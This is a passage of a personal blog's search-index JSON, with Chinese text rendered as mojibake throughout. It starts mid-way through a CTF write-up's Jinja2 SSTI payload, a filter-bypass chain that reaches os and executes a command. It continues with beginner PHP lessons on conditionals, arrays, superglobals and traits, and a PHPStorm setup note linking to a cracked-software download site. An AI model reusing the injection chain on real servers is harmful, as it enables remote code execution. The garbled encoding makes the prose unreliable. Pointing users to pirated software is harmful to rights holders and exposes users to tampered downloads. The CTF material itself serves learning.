s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%}{%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%}#ä½¿ç”¨importå¼•å…¥osæ¨¡å—ï¼Œè°ƒç”¨read()æ–¹æ³•{%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%}#ç†Ÿæ‚‰çš„ç±»ç»§æ‰¿åˆ©ç”¨é“¾{{u}}#æ‰§è¡Œæ­¤é“¾ å°ç»“:è¿™æ¬¡çš„å¤ç°æœ‰ç‚¹è¿Ÿï¼Œå¥½åœ¨è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ„Ÿè§‰sstiæ³¨å…¥çš„æœ€é«˜ç­‰çº§åº”è¯¥å°±æ˜¯ä¸œæ‹¼è¥¿å‡‘äº†å§ï¼Ÿå¯èƒ½æ˜¯æˆ‘è¿˜æ²¡é‡åˆ°æ›´éš¾çš„é¢˜å§","link":"/2021/04/07/MAR-DASCTF%E5%A4%8D%E7%8E%B0/"},{"title":"PHP if switch æ•°ç»„","text":"ä»Šå¤©å­¦ä¹ çš„æ˜¯æ¡ä»¶è¯­å¥ é¦–å…ˆæ˜¯ifè¯­å¥å¬è¯´PHPçš„å†…æ ¸æ˜¯Cè¯­è¨€ç¼–å†™çš„ï¼Œæ‰€ä»¥å¾ˆå¤šéƒ½å’ŒCæœ‰ç‚¹åƒï¼Œè¿™ä¸ªifè¯­å¥ä¹Ÿæ˜¯æ ¼å¼æ˜¯ï¼š 1234ifï¼ˆæ¡ä»¶ï¼‰{ æ¡ä»¶æˆç«‹æ—¶è¦æ‰§è¡Œçš„ä»£ç ;//è¿™è¾¹æœ‰ä¸ªåˆ†å·ï¼Œå…¶ä»–åœ°æ–¹æ²¡æœ‰} ä¸¾ä¸ªä¾‹å­ï¼š 123456&lt;?php $t=22; if($t&gt;&quot;20&quot;){ echo&quot;hwg is cool&quot;;}?&gt; è¾“å‡ºç»“æœæ˜¯ hwg is cool ç„¶åæ˜¯ifâ€¦elseè¯­å¥12345678if (*æ¡ä»¶*){*æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œçš„ä»£ç ;*}else{*æ¡ä»¶ä¸æˆç«‹æ—¶æ‰§è¡Œçš„ä»£ç ;*} ç”±äºå’ŒCéƒ½å·®ä¸å¤šï¼Œæˆ‘å°±æ‡’å¾—ä¸¾ä¾‹äº†ï¼Œå¾…ä¼šå†ä¸‹é¢æ‰¾å‡ ä¸ªé¢˜ç›®è¿‡æ¥è¯•è¯•ï¼› ifâ€¦elseifâ€¦.else è¯­å¥æ„Ÿè§‰è¿™ä¸ªæ˜¯ä¼šç¨å¾®éš¾ä¸€ç‚¹çš„ 123456789101112if (æ¡ä»¶){ if æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œçš„ä»£ç ;}elseif (æ¡ä»¶){ elseif æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œçš„ä»£ç ;}else{ æ¡ä»¶ä¸æˆç«‹æ—¶æ‰§è¡Œçš„ä»£ç ;} ä¾‹å­ï¼š 12345678910111213&lt;?php $t=date(&quot;H&quot;);//è¿™é‡Œçš„dateï¼ˆ&quot;H&quot;ï¼‰ä»£è¡¨çš„æ„æ€æ˜¯è·å–å½“å‰çš„å°æ—¶æ•°if ($t&lt;&quot;10&quot;){ echo &quot;have a good morning&quot;;}elseif($t&lt;&quot;20&quot;){ echo&quot;have a good dany!&quot;;}else echo &quot;have a good night&quot;;}?&gt; è¡¥å……ï¼šfunction data($value) {}å¦‚æœæ˜¯date ï¼Œé‚£å°±æ˜¯ç”¨æ¥è·å–æ—¶é—´çš„ï¼Œh è¡¨ç¤ºå°æ—¶ï¼Œå¹¶ä¸”æ˜¯12 å°æ—¶åˆ¶çš„ï¼›date(â€˜Y-m-d H:i:sâ€™, time()); // 2015-8-11 9:05:05ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ä¼ æ—¶é»˜è®¤å–å½“å‰æ—¶é—´æˆ³date(â€˜Yâ€™) // å¹´ä»½ 2015ï¼Œå¤§å†™Y æ˜¯4ä½ï¼Œå°å†™ä¸º2ä½date(â€˜mâ€™) // æœˆä»½ 8date(â€˜Hâ€™) // å°æ—¶ 9ï¼Œå¤§å†™H æ˜¯24å°æ—¶åˆ¶ï¼Œå°å†™ä¸º12å°æ—¶åˆ¶ switch caseè¯­å¥å’ŒCä¹Ÿå·®ä¸å¤šï¼Œå°±è¯´ä¸€ä¸‹æƒ³è®©æ‰§è¡Œåˆ°ä¸€ä¸ªcaseè¯­å¥å°±è¾“å‡ºï¼Œå°±å¾— åŠ breakæ‰å¯ä»¥æƒ³è®©ä»–æ‰§è¡Œå®Œä¸€åœˆéƒ½æ²¡å¾—è¾“å‡ºï¼Œåªèƒ½åœ¨æœ€åè¾“å‡ºï¼Œå°±è¦åœ¨æœ€ååŠ defaultï¼ˆdefault è¯­å¥ç”¨äºä¸å­˜åœ¨åŒ¹é…ï¼ˆå³æ²¡æœ‰ case ä¸ºçœŸï¼‰æ—¶æ‰§è¡Œã€‚ï¼‰ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011121314151617&lt;?php$favcolor=&quot;red&quot;;switch ($favcolor){case &quot;red&quot;: echo &quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯çº¢è‰²!&quot;; break;case &quot;blue&quot;: echo &quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯è“è‰²!&quot;; break;case &quot;green&quot;: echo &quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯ç»¿è‰²!&quot;; break;default: echo &quot;ä½ å–œæ¬¢çš„é¢œè‰²ä¸æ˜¯ çº¢, è“, æˆ–ç»¿è‰²!&quot;;}?&gt; è¾“å‡ºç»“æœæ˜¯ ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯çº¢è‰²ï¼ æ¥ä¸‹æ¥å†æ¥è®²ä¸€ä¸‹ä¹‹å‰æè¿‡çš„æ•°ç»„é¦–å…ˆæ˜¯arrayï¼ˆï¼‰å‡½æ•°å¯ä»¥ç”¨äºåˆ›å»ºå‡½æ•°æ ¼å¼æ˜¯ 1array(); åœ¨PHPä¸­ï¼Œæœ‰ä¸‰ç§ç±»å‹çš„æ•°åœ¨ PHP ä¸­ï¼Œæœ‰ä¸‰ç§ç±»å‹çš„æ•°ç»„ï¼š æ•°å€¼æ•°ç»„ - å¸¦æœ‰æ•°å­— ID é”®çš„æ•°ç»„æœ‰ä¸¤ç§åˆ›å»ºæ•°å€¼æ•°ç»„çš„æ–¹æ³•ï¼š ç¬¬ä¸€ç§æ–¹æ³•æ˜¯è‡ªåŠ¨åˆ†é…IDé”®ï¼› 1$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;hauwei&quot;);//è¿™æ ·çš„ç»“æœæ˜¯ï¼Œvivoä¼šè‡ªåŠ¨å˜æˆ$phone[0]ä»¥æ­¤ç±»æ¨ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ•°ç»„çš„IDåˆ›å»ºæ˜¯ä»0å¼€å§‹çš„ ç¬¬äºŒç§æ–¹æ³•æ˜¯ç›´æ¥åˆ›å»º 12$phone[0]=&quot;vivo&quot;;$phone[1]=&quot;iphone&quot;; ä¸‹é¢è¿è¡Œä¸‹å®ä¾‹: 1234&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);echo &quot;I like&quot; . $phone[0] . &quot;,&quot; .$phone[1] . &quot;,&quot;.$phone[2].&quot;.&quot;;?&gt;//è¾“å‡ºçš„ç»“æœæ˜¯æˆ‘å–œæ¬¢vivoï¼Œiphonï¼Œhuaweiã€‚ å…³è”æ•°ç»„-å¸¦æœ‰åˆ¶å®šçš„é”®çš„æ•°ç»„ï¼Œæ¯ä¸ªé”®å…³è”ä¸€ä¸ªå€¼ é€šä¿—ç‚¹è¯´å°±æ˜¯ï¼Œä½ è¦ç»™ä¸‰ä¸ªå˜é‡éƒ½èµ‹äºˆä¸€ä¸ªç›¸åŒå±æ€§çš„å€¼ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨å…³è”æ•°ç»„æ¯”å¦‚è¯´ 1$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); è¿™æ ·çš„è¯ï¼Œæ¯ä¸ªäººéƒ½è¢«èµ‹äºˆäº†å¹´é¾„è¿™ä¸ªå±æ€§å€¼ä¸¾ä¸ªä¾‹å­ 1234&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age['Peter'] . &quot; years old.&quot;;?&gt;//è¾“å‡ºçš„ç»“æœæ˜¯peter is 35years old. è¿™é‡Œæœ‰æåˆ°ä¸€ä¸ªè·å–æ•°ç»„çš„é•¿åº¦-count()å‡½æ•°count()å‡½æ•°ç”¨äºè¿”å›æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ çš„æ•°é‡ï¼‰ç›´æ¥æ”¾ä¸ªä¾‹å­å§ 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt; è¾“å‡ºçš„ç»“æœæ˜¯3ï¼ŒåŸæ¥ï¼Œè¿™ä¸ªcountè¾“å‡ºçš„æ˜¯arrayè¿™ä¸ªå‡½æ•°æ•°ç»„ä¸­æ‰€åŒ…å«çš„å…ƒç´ æ•°é‡ éå†æ•°ç»„éå†å¹¶æ‰“å°æ•°å€¼æ•°ç»„ä¸­çš„æ‰€æœ‰å€¼ï¼Œå¯ä»¥ä½¿ç”¨forå¾ªç¯ã€‚ 123456789&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);$arraylenth=count($iphone);//è¿™è¾¹çš„countï¼ˆ$iphoneï¼‰å°±å¯ä»¥ç›´æ¥æ•°å‡ºiphoneçš„æ•°ç»„å…ƒç´ é•¿åº¦äº†for($x=0;$x&lt;$arraylength;x++){ echo $phone[$x]ï¼› echo &lt;&quot;br&quot;&gt;;}?&gt; è¾“å‡ºçš„ç»“æœæ˜¯ vivo iphone huaweiéå†å¹¶æ‰“å°å…³è”æ•°ç»„å¯ä»¥ä½¿ç”¨foreachå¾ªç¯ï¼Œè¿™é‡Œå°±éœ€è¦è¯´æ˜ä¸€ä¸‹ä¸€ä¸‹foreachå¾ªç¯äº† 1234foreach ($array as $value){ è¦æ‰§è¡Œä»£ç ;} 1234foreach ($array as $key =&gt; $value){ è¦æ‰§è¡Œä»£ç ;} ä¸¤ä¸ªéƒ½æ˜¯foreachå¾ªç¯ç¬¬ä¸€ä¸ªæ˜¯ï¼Œç”¨å®˜æ–¹çš„è¯æ¥è¯´æ˜¯ï¼Œæ²¡è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™$valueå˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆä¼šé€ä¸€å¾€ä¸‹ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œå°†ä¼šçœ‹åˆ°æ•°ç»„ä¸­çš„é”®ä¸å€¼æˆ‘çš„ç†è§£æ˜¯ï¼Œï¼ˆæŠŠæ¦‚å¿µæ‰“ä¸€éï¼Œçªç„¶æ„Ÿè§‰è‡ªå·±çš„æƒ³æ³•å°±æ˜¯æ¦‚å¿µçš„æƒ³æ³•ï¼Ÿï¼‰ï¼Œæ•°ç»„çš„å€¼éƒ½ä¼šè¢«æŒ‰é¡ºåºä»¥valueå˜é‡ä¸ºè½½ä½“è¾“å‡º è€Œç¬¬äºŒä¸ªæ˜¯ï¼Œç”¨å®˜æ–¹çš„è¯æ¥è¯´ï¼Œæ¯ä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®ä¸å€¼å°±éƒ½ä¼šè¢«èµ‹å€¼ç»™ $key å’Œ $value å˜é‡ï¼ˆæ•°å­—æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œä½ å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªé”®ä¸å€¼ã€‚æˆ‘çš„ç†è§£æ˜¯ï¼Œä»–æ˜¯åœ¨ä¸Šä¸€ç§çš„åŸºç¡€ä¸Šï¼Œå¤šå¢åŠ äº†ä¸€ä¸ª$keyå˜é‡ï¼Œç„¶åå°†æ•°ç»„çš„åºå·æˆ–è€…ä»£ç§°ä»¥keyçš„å½¢å¼è¾“å‡ºï¼Œï¼Œç„¶åå¦ä¸€ä¸ªvalueæ•ˆæœå’Œä¸Šä¸€ä¸ªä¸€æ ·å°±ä¸è¯´äº†ã€‚ç„¶åè¿™ä¸ªkeyå’Œvalueæ˜¯å¯ä»¥æ›¿æ¢æˆå…¶ä»–å­—æ¯çš„ ä¾‹ï¼š 1234567&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $value){ echo $value;}?&gt; 12345678&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $name =&gt; $old){ echo &quot;name=&quot;.$name .&quot;, old=&quot; . $old;//echoè¾“å‡ºå¤šä¸ªå€¼ï¼Œä¸­é—´è®°å¾—è¦ç”¨.è¿æ¥ echo &quot;&lt;br&gt;&quot;;}?&gt; PHPæ•°ç»„æ’åº sort() - å¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— rsort() - å¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ— asort() - æ ¹æ®å…³è”æ•°ç»„çš„å€¼ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— ksort() - æ ¹æ®å…³è”æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— arsort() - æ ¹æ®å…³è”æ•°ç»„çš„å€¼ï¼Œå¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ— krsort() - æ ¹æ®å…³è”æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ— åˆ—ä¸¾å…¶ä¸­ä¸€ä¸ªå°±å¥½ 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);sort($cars);//å…¶ä¸­çš„sortå¯ä»¥æ›¿æ¢?&gt; è¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å…ƒç´ çš„å­—æ¯å‡åºæ’åˆ—çš„","link":"/2020/10/11/PHP-if-switch-%E6%95%B0%E7%BB%84/"},{"title":"PHPSTORMé…ç½®éšç¬”è®°å½•","text":"å½“æ—¶å¼„è¿™ä¸ªå¼„äº†å¥½ä¹…ï¼Œä¸çŸ¥é“æ˜¯å“ªä¸€æ­¥å‡ºé”™äº†ï¼Œæœ€åç»ˆäºæ‰æˆåŠŸäº†ï¼Œäºæ˜¯è®°å½•ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½å¸®åˆ°å…¶ä»–åŒå­¦ä»¬ ç ´è§£ç‰ˆä¸‹è½½åœ°å€ï¼šhttp://www.xue51.com/soft/37849.htmlxdebugå®‰è£…ï¼šhttps://segmentfault.com/a/1190000011907425è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€å®šè¦æ‰¾åˆ°é€‚åˆè‡ªå·±phpç‰ˆæœ¬çš„xdebugç‰ˆæœ¬ï¼Œæˆ‘çš„æ˜¯PHP7.4æ‰€ä»¥æˆ‘ç”¨çš„xdebugæ˜¯2.98çš„xdebugç‰ˆæœ¬æŸ¥çœ‹:https://blog.csdn.net/ABAP_Brave/article/details/78615270xdebugä½¿ç”¨æ•™ç¨‹ï¼šhttps://www.php.cn/jishu/php/410116.htmlè¿™é‡Œè¯´ä¸€ä¸‹æ“ä½œï¼Œæ‰“å¼€æ–‡ä»¶ ç”¨å°ç”µè¯ç›‘å¬ï¼Œç”¨æµè§ˆå™¨æ‰“å¼€å¯¹åº”é¡µé¢ï¼Œç„¶åç«¯å£è®°å¾—è®¾ç½®ä½ æœåŠ¡å™¨çš„ï¼Œæ‰“ç‚¹åï¼Œå¼€å¯å°ç”²è™«å³å¯","link":"/2021/03/06/PHPSTORM%E9%85%8D%E7%BD%AE%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"},{"title":"PHPè¶…çº§å…¨å±€å˜é‡ä»¥åŠä¸¤ä¸ªå¾ªç¯","text":"é¦–å…ˆæ˜¯PHPçš„è¶…çº§å…¨å±€å˜é‡é¦–å…ˆæ˜¯è¶…çº§å…¨å±€å˜é‡çš„å®šä¹‰:æ„å‘³ç€å®ƒä»¬åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨äºä¸­éƒ½å¯ç”¨ï¼Œä¸éœ€è¦ç‰¹åˆ«è¯´æ˜ï¼Œå°±å¯ä»¥åœ¨å‡½æ•°åŠç±»ä¸­ä½¿ç”¨ã€‚ ç¬¬ä¸€ä¸ªæ˜¯$GLOBALSè¿™ä¸ªå…¶å®åœ¨ä¹‹å‰æœ‰ä»‹ç»è¿‡äº†ï¼Œä¸è¿‡è¿™æ¬¡çš„æ ¼å¼å¯èƒ½æ¯”è¾ƒä¸ä¸€æ ·ç›´æ¥æ‹¿ä¾‹å­äº†ï¼š 123456789101112&lt;?php $x = 75; $y = 25;function addition() { $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; }addition(); echo $z; ?&gt; è¾“å‡ºç»“æœæ˜¯ 100ç¬¬äºŒä¸ªæ˜¯$_SERVERè¿™æ˜¯ä¸€ä¸ªåŒ…å«äº†å¾ˆå¤šä¿¡æ¯çš„æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”±webæœåŠ¡å™¨åˆ›å»ºã€‚ https://www.runoob.com/php/php-superglobals.htmlåœ¨è¿™ä¸ªé“¾æ¥ä¸­ï¼ŒåŒ…å«äº†$_SERVERå˜é‡ä¸­çš„é‡è¦å…ƒç´  ä¸‹é¢æ•´ç†äº†å‡ ä¸ªä¸ªäººæ„Ÿè§‰å¸¸ç”¨å‘½ä»¤*$_SERVER[â€˜REMOTE_ADDRâ€™] //å½“å‰ç”¨æˆ· IP****$_SERVER[â€˜SERVER_ADDRâ€™]//å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨çš„IPåœ°å€**$_SERVER[â€˜SERVER_PROTOCOLâ€™]//è¯·æ±‚é¡µé¢é¡µé¢æ—¶çš„é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬$_SERVER[â€˜REQUEST_METHODâ€™]// è®¿é—®é¡µé¢ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼›ä¾‹å¦‚ï¼Œâ€GETâ€, â€œHEADâ€ï¼Œâ€POSTâ€ï¼Œâ€PUTâ€è¿™è¾¹å»çœ‹äº†ä¸€ä¸‹è¿™äº›æŒ‡ä»¤çš„åŒºåˆ«ï¼šé¦–å…ˆæ˜¯getå’Œpost getæ˜¯ä»æœåŠ¡å™¨ä¸Šè·å–æ•°æ®ï¼Œpostæ˜¯å‘æœåŠ¡å™¨ä¼ é€æ•°æ®ã€‚ getæ˜¯æŠŠå‚æ•°æ•°æ®é˜Ÿåˆ—åŠ åˆ°æäº¤è¡¨å•çš„ACTIONå±æ€§æ‰€æŒ‡çš„URLä¸­ï¼Œå€¼å’Œè¡¨å•å†…å„ä¸ªå­—æ®µä¸€ä¸€å¯¹åº”ï¼Œåœ¨URLä¸­å¯ä»¥çœ‹åˆ°ã€‚postæ˜¯é€šè¿‡HTTP postæœºåˆ¶ï¼Œå°†è¡¨å•å†…å„ä¸ªå­—æ®µä¸å…¶å†…å®¹æ”¾ç½®åœ¨HTML HEADERå†…ä¸€èµ·ä¼ é€åˆ°ACTIONå±æ€§æ‰€æŒ‡çš„URLåœ°å€ã€‚ç”¨æˆ·çœ‹ä¸åˆ°è¿™ä¸ªè¿‡ç¨‹ã€‚ å¯¹äºgetæ–¹å¼ï¼ŒæœåŠ¡å™¨ç«¯ç”¨Request.QueryStringè·å–å˜é‡çš„å€¼ï¼Œå¯¹äºpostæ–¹å¼ï¼ŒæœåŠ¡å™¨ç«¯ç”¨Request.Formè·å–æäº¤çš„æ•°æ®ã€‚ getä¼ é€çš„æ•°æ®é‡è¾ƒå°ï¼Œä¸èƒ½å¤§äº2KBã€‚postä¼ é€çš„æ•°æ®é‡è¾ƒå¤§ï¼Œä¸€èˆ¬è¢«é»˜è®¤ä¸ºä¸å—é™åˆ¶ã€‚ä½†ç†è®ºä¸Šï¼ŒIIS4ä¸­æœ€å¤§é‡ä¸º80KBï¼ŒIIS5ä¸­ä¸º100KBã€‚ getå®‰å…¨æ€§éå¸¸ä½ï¼Œpostå®‰å…¨æ€§è¾ƒé«˜ã€‚ è¿˜æœ‰ä¸€ä¸ªæ›´è¯¦ç»† https://www.zhihu.com/question/28586791/answer/767316172ç­‰ä»¥åé‡åˆ°éœ€è¦æ›´æ·±å…¥äº†è§£æ—¶ï¼Œå†å»å›é¡¾ã€‚**&amp;SERVER[â€˜HTTPSâ€™]:å¦‚æœè„šæœ¬æ˜¯é€šè¿‡HTTPSåè®®è¢«è®¿é—®ï¼Œåˆ™è¢«è®¾ä¸ºä¸€ä¸ªéç©ºçš„å€¼**&amp;_SERVER[â€˜REMOTE_HOSTâ€™]:æµè§ˆå½“å‰é¡µé¢çš„ç”¨æˆ·çš„ä¸»æœºåï¼ŒDNSåå‘è§£æä¸ä¾æ‡’äºç”¨æˆ·çš„REMOTE_ADDR&amp;_SERVER[â€˜REMOTE_PORTâ€™]:ç”¨æˆ·æœºå™¨ä¸Šè¿æ¥åˆ°WEBæœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ç«¯å£å·&amp;_SERVER[â€˜SCRIPT_URIâ€™]:URIç”¨æ¥æŒ‡å®šè¦è®¿é—®çš„é¡µé¢**&amp;_SERVER[â€˜PHP_SELFâ€™]:**å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œä¸ document root æœ‰å…³ã€‚ä¾‹å¦‚ï¼Œåœ¨åœ°å€ä¸º http://example.com/test.php/foo.bar çš„è„šæœ¬ä¸­ä½¿ç”¨ $_SERVER[â€˜PHP_SELFâ€™] å°†å¾—åˆ° /test.php/foo.barã€‚__FILE_ å¸¸é‡åŒ…å«å½“å‰(ä¾‹å¦‚åŒ…å«)æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚ ä» PHP 4.3.0 ç‰ˆæœ¬å¼€å§‹ï¼Œå¦‚æœ PHP ä»¥å‘½ä»¤è¡Œæ¨¡å¼è¿è¡Œï¼Œè¿™ä¸ªå˜é‡å°†åŒ…å«è„šæœ¬åã€‚ä¹‹å‰çš„ç‰ˆæœ¬è¯¥å˜é‡ä¸å¯ç”¨ã€‚ ç¬¬ä¸‰ä¸ªæ˜¯$_REQUEST PHP $_REQUEST ç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ®ã€‚ ä»¥ä¸‹å®ä¾‹æ˜¾ç¤ºäº†ä¸€ä¸ªè¾“å…¥å­—æ®µï¼ˆinputï¼‰åŠæäº¤æŒ‰é’®(submit)çš„è¡¨å•(form)ã€‚ å½“ç”¨æˆ·é€šè¿‡ç‚¹å‡» â€œSubmitâ€ æŒ‰é’®æäº¤è¡¨å•æ•°æ®æ—¶, è¡¨å•æ•°æ®å°†å‘é€è‡³æ ‡ç­¾ä¸­ action å±æ€§ä¸­æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œæˆ‘ä»¬æŒ‡å®šæ–‡ä»¶æ¥å¤„ç†è¡¨å•æ•°æ®ã€‚å¦‚æœä½ å¸Œæœ›å…¶ä»–çš„PHPæ–‡ä»¶æ¥å¤„ç†è¯¥æ•°æ®ï¼Œä½ å¯ä»¥ä¿®æ”¹è¯¥æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶åã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¶…çº§å…¨å±€å˜é‡ $_REQUEST æ¥æ”¶é›†è¡¨å•ä¸­çš„ input å­—æ®µæ•°æ®:(å®˜æ–¹ç†è§£) è¿™ä¾¿è¡¥å……ä¸€ä¸‹ï¼šREQUESTï¼šå…·æœ‰$_POST[]$_GET[]çš„åŠŸèƒ½ï¼Œä½†æ˜¯$_REQUEST[]ä¼šæ¯”è¾ƒæ…¢ã€‚é€šè¿‡postå’Œgetæ–¹æ³•æäº¤çš„æ‰€æœ‰æ•°æ®éƒ½å¯ä»¥é€šè¿‡$REQUESTæ•°ç»„è·å¾— 12345678910111213141516//&lt;!DOCTYPE html&gt;//&lt;html&gt;//&lt;body&gt;//&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER['PHP_SELF'];?&gt;&quot;&gt;//Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;//&lt;input type=&quot;submit&quot;&gt;//&lt;/form&gt;&lt;?php $name = htmlspecialchars($_REQUEST['fname']); echo $name; ?&gt;&lt;/body&gt;&lt;/html&gt; PHP$_POSTå’ŒPHP$_GETPHP $_POST è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼šâ€method=â€postâ€å°±æ˜¯ä¸Šé¢ä¸ªå®ä¾‹ï¼Œå±•ç¤ºä¸€ä¸‹GETåœ¨æµ‹è¯•å½“ä¸­ æŒ‰äº†é‚£ä¸ª 123456789//&lt;html&gt;//&lt;body&gt;//&lt;?php //echo &quot;Study &quot; . $_GET['subject'] . &quot; @ &quot; . $_GET['web'];//?&gt;//&lt;/body&gt;//&lt;/html&gt; ä¼šå‡ºç°ä¸€ä¸ªGET testçš„æŒ‰é’®ï¼Œç‚¹ä¸€ä¸‹ å°±ä¼šå‘é€subject å’Œwebçš„å‚æ•° æ„Ÿè§‰è¿™ç‰‡å¾ˆæ°´ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘htmlè¿˜æ²¡å­¦ï¼Œç­‰æˆ‘å­¦å®Œäº†å†å›æ¥è¡¥å……æ‹“å±•","link":"/2020/10/12/PHP%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E4%B8%A4%E4%B8%AA%E5%BE%AA%E7%8E%AF/"},{"title":"PHPé­”æœ¯å¸¸é‡ä»¥åŠå‘½åç©ºé—´","text":"PHPé­”æœ¯å¸¸é‡-traitå…¶ä»–é­”æœ¯å¸¸é‡éƒ½æ¯”è¾ƒç®€å•ï¼Œå°±ä¸å…·ä½“å±•å¼€äº†ä¸»è¦è¯´è¯´trait1.traitçš„åŠŸèƒ½å’Œclassçš„åŠŸèƒ½æ˜¯å¾ˆæ¥è¿‘çš„ï¼Œéƒ½å¯ä»¥å®šä¹‰ä¸€ä¸ªç±»ï¼Œå¹¶èµ‹äºˆæ–¹æ³•2.ä½†æ˜¯å¦‚æœä½ è¦è®©è¿™ä¸ªç±»è¢«ä¸­çš„æ–¹æ³•è¢«ç»§æ‰¿ä½¿ç”¨ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨traitä¸¾ä¸ªä¾‹å­ 12345678910111213141516171819202122&lt;?phpclass cup{ function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; }}class wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ //æ­¤æ—¶ä½ å¦‚æœæƒ³è¦è¿™ä¸ªtoolsåŒæ—¶æ‹¥æœ‰ç¢—å’Œæ¯å­çš„åŠŸèƒ½å°±ä¸å¯ä»¥äº†ã€‚}?&gt; ä½†æ˜¯å½“ä½ æŠŠå‰ä¸¤ä¸ªclassæ¢æˆtraitæ—¶ï¼Œå°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªåŠŸèƒ½ 123456789101112131415161718192021222324&lt;?phptrait cup{ function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; }}trait wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ use cup;}$makecup = new tools();$makecup -&gt; water();//-å’Œ&gt;ä¹‹é—´ä¸å¯ä»¥æœ‰ç©ºæ ¼?&gt; è¿™è¾¹å†ç†è§£ä¸€ä¸‹traitåµŒå¥—traitï¼š 123456789101112131415161718192021222324252627282930313233&lt;?phptrait test{ function demo() { echo&quot;æ­£åœ¨æµ‹è¯•&quot;; }}trait cup{ use test; function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; }}trait wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ use 